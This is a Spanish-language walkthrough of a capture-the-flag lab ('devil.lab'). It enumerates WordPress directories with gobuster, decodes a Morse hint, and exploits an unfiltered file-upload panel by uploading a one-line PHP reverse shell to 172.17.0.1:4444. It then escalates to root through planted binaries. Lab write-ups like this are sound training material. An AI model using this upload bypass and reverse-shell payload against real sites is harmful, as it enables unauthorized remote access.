## Reconocimiento:

Puerto 80 : HTTP

Haciendo fuzzing veo que tiene WordPress y aparte redirige a un dominio:

```bash
http://devil.lab
```

Vuelvo a hacer fuzzing ya que en la web no encuentro nada:

```bash
gobuster dir -u http://devil.lab/wp-content -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100 -k -r
```

Encuentro:

```bash
http://devil.lab/wp-content/uploads/esteestudirectorio/aqui.txt
```

```bash
-- . .--- --- .-.
.--. .-. ..- . -... .-
.... .-
.... .- -.-. . .-.
..-. ..- --.. .. -. --.
.--. . .-. ---
-. ---
. -.
. ... - .
-.. .. .-. . -.-. - --- .-. .. ---
.--. .-. ..- . -... .-
-.-. --- -.
..- -.
-.. .. .-. . -.-. - --- .-. .. ---
.- - .-. .- ... .-.-.-
```

Es un mensaje encriptado en morse, se lo paso a Chatgpt y dice:

```bash
"Mejor prueba hacer fuzzing, pero no es directorio. Prueba con un directorio atrás"
```

Después de mucho rato doy con el correcto:

```bash
gobuster dir -u http://devil.lab/wp-content/plugins -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100 -k -r
```

Encuentro el directorio /backdoor.

Dentro hay un panel para subir un curriculum en pdf, pero tras una prueba se ve que no filtra bien el archivo y deja subir cualquiera. Así que subo una rev shell:

revshell.php

```php
<?php
$sock=fsockopen("172.17.0.1",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Me pongo a la escucha:

```php
nc -lnvp 4444
```

Y ejecuto:

```bash
http://devil.lab/wp-content/plugins/backdoor/uploads/shell.php
```

Recibo conexión.

## Escalada www-data - lucas

En la carpeta /home/andy hay un directorio secreto:

```bash
cd /home/andy/.secret
# Info:
-rwxr-xr-x 1 andy andy   512 Sep 11 22:31 escalate.c
-rwxr-xr-x 1 andy andy 16176 Sep 11 22:33 ftpserver
```

Al ejecutar él ftpserver, se nos abre una shell con el usuario lucas.

## Escalada lucas → root

En la carpeta /home/lucas hay un “juego” en C.

```bash
cd /home/lucas/.game
```

Veo:

```bash
EligeOMuere
```

Pide introducir un digito del 1-10 y si aciertas te lanza una shell con permisos root. 

```bash
¡Bienvenido al juego de adivinanzas!
Adivina el número secreto (entre 1 y 10): 7
¡Felicidades! Has adivinado el número.
Iniciando shell como root...
```

Listo.
